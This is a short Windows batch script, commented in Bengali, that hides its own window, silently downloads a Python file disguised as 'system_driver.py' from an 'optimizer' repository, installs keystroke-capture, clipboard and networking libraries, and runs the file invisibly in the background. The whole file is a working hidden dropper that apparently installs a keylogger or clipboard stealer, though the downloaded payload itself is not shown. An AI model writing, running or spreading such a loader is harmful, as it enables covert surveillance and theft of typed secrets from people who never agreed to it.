@echo off
:: Window hide korar jonno
if "%1"=="h" goto :begin
start mshta vbscript:CreateObject("WScript.Shell").Run("""%~f0"" h",0)(window.close)&&exit
:begin

:: Define URLs
set "SCRIPT_URL=https://raw.githubusercontent.com/coolrain14053/optimizer/main/system_driver.py"
set "SCRIPT_NAME=system_driver.py"

:: Download silently
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%SCRIPT_URL%', '%SCRIPT_NAME%')"

:: Install dependencies silently
python -m pip install pynput pyperclip requests --quiet

:: Run in background and close terminal immediately
start /b pythonw %SCRIPT_NAME%

exit